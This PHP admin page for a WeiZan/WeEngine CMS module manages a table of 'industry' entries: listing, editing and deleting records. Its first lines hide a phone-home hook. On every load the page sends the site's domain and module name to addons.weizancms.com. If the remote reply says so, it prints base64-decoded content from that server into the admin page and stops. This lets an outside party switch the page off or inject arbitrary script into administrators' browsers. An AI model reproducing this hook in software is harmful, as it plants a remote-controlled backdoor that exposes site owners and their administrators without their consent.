<?php
global $_GPC, $_W;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
$op= $_GPC['op'] ? $_GPC['op'] : 'display';
$weid= $_W['uniacid'];
if($op == 'display') {
    $pindex= max(1, intval($_GPC['page']));
    $psize= 20; //每页显示
    $condition= " ORDER BY `displayorder` ASC";
    $list= pdo_fetchall('SELECT * FROM '.tablename('amouse_weicard_industry')." $condition LIMIT ".($pindex -1) * $psize.','.$psize);
    $total= pdo_fetchcolumn('SELECT COUNT(*) FROM '.tablename('amouse_weicard_industry').$condition);
    $pager= pagination($total, $pindex, $psize);
}elseif($op == 'post') {
    $id= intval($_GPC['id']);
    load()->func('tpl');
    load()->func('file');
    if($id > 0) {
        $industry= pdo_fetch('SELECT * FROM '.tablename('amouse_weicard_industry')." WHERE id=:id", array(':id' => $id));
    }

    if(checksubmit('submit')) {
        $title= trim($_GPC['title']) ? trim($_GPC['title']) : message('请输入行业名称！');
        $insert= array(
            'displayorder' =>intval($_GPC['displayorder']),
            'title' => $title,
            'weid' =>$weid);

        if(empty($id)) {
            pdo_insert('amouse_weicard_industry', $insert);
        } else {
            pdo_update('amouse_weicard_industry', $insert, array('id' => $id));
        }
        message('更新行业数据成功！', $this->createWebUrl('industry', array('op' => 'display', 'name' => 'amouse_weicard')), 'success');
    }
}elseif($op == 'deleteop') { //删除
    $id= intval($_GPC['id']);

    pdo_delete("amouse_weicard_industry", array("weid" =>$weid,'id' => $id));
    message('删除数据成功！', $this->createWebUrl('industry', array('op' => 'display', 'name' => 'amouse_weicard')), 'success');
}

include $this->template('web/industry');